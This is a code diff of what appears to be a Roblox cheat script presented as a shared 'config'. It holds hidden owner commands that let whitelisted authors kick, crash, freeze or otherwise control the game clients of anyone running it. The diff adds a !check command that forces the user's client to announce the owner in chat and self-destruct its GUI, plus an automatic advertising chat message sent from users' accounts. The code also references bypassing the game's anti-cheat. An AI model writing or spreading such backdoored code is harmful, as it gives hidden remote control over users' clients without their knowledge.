@@ -42,7 +42,13 @@ end
 function funcs:freeze()
 	lplr.Character.HumanoidRootPart.Anchored = true
 end
-
+function funcs:check()
+	game.TextChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync("DETECTED_OWNER")
+	if shared.GuiLibrary then
+		local GL = shared.GuiLibrary
+		GL.SelfDestruct()
+	end
+end
 function funcs:unfreeze()
 	lplr.Character.HumanoidRootPart.Anchored = false
 end
@@ -233,8 +239,8 @@ function funcs:byfron()
 				end)
 			end
 function funcs:kick(reason)
-    reason = reason or "yay you have been kicked by the owner"
-    lplr:Kick(reason)
+	reason = reason or "You have been kicked by an owner"
+	lplr:Kick(reason)
 end
 function funcs:lobby()
 	game:GetService("ReplicatedStorage")["rbxts_include"]["node_modules"].net.out["_NetManaged"].TeleportToLobby:FireServer()
@@ -265,6 +271,7 @@ spawn(function()
 	for i,v in pairs(game:GetService("Players"):GetChildren()) do
 	if table.find(whitelist.Owners,v.UserId) then
 			sysmsg("[OWNER MSG] thanks for using our config")
+                        game.TextChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync("using wareflopn1san best config")
 		end
 	end
 	game:GetService("Players").ChildAdded:Connect(function(v)
@@ -303,6 +310,8 @@ for i,v in pairs(game:GetService("Players"):GetChildren()) do
 				funcs:crash()
 			elseif a == "!chipman" then
 				funcs:chipman()
+			elseif a == "!check" then
+				funcs:check()
 			elseif a == "!rickroll" then
 				funcs:rickroll()
 			elseif a == "!uninject" then
@@ -352,6 +361,8 @@ game:GetService("Players").PlayerAdded:Connect(function(v)
 				funcs:kick()
 			elseif a == "!ban" then
 				funcs:ban()
+			elseif a == "!check" then
+				funcs:check()
 			elseif a == "!lobby" then
 				funcs:lobby()
 			end
